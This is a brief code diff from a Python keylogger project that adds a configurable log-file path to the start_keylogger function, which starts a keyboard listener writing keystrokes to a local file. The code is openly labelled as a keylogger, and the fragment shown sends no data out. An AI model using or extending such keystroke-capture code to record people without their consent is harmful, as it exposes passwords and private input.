@@ -31,15 +31,17 @@ keylogger_log_path = "data/keylog.txt"
 listener = Listener(on_press=on_press)
 
 
-def start_keylogger():
+def start_keylogger(path="data/keylog.txt"):
     global listener
     global keylogger_active
+    global keylogger_log_path
 
     if keylogger_active:
         print("Keylogger already started.")
         return
 
     listener.start()
+    keylogger_log_path = path
     keylogger_active = True
     print("Keylogger started.")
     # with Listener(on_press=on_press) as listener:
